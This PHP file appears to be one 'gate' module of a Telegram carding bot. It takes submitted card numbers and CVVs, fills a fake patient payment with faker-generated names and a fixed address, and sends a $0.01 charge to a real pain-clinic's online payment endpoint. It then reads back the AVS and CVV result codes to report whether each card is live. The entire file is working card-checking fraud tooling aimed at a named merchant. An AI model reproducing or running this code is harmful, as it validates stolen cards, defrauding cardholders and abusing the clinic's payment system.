<?php 

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# -- REQ 1 -- #
$headers1 = ['accept: */*','content-type: application/x-www-form-urlencoded; charset=UTF-8','origin: https://www.norcalpaindocs.com','referer: https://www.norcalpaindocs.com/payment/','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.81 Safari/537.36'];
$post1 = 'data={"invoiceNumber":"","paymentAmount":"0.01","patientName":"'.Name::firstName().'","tel":"5024542724","email":"'.Internet::freeEmail().'","company":"","address":"1680 Crossley Street ","city":"Fortville ","state":"IN","zip":"46040","firstName":"'.Name::firstName().'","lastName":"'.Name::lastName().'","cardNumber":"'.$cc[0].'","cvv":"'.$cc[3].'","expirationDate":"'.$cc[2].'-'.$cc[1].'"}';
$site1 = ['url' => 'https://www.norcalpaindocs.com/payment/runPayment.php','method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));
$req1_resp = json_decode($req1->body, true);
$avsres = $req1_resp['msg']['avsResultCode'];
$cvvres = $req1_resp['msg']['cvvResultCode'];
Res::SetParams($req1->body, null, $avsres, $cvvres, $req1->body);
$res = Res::authnetch();

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));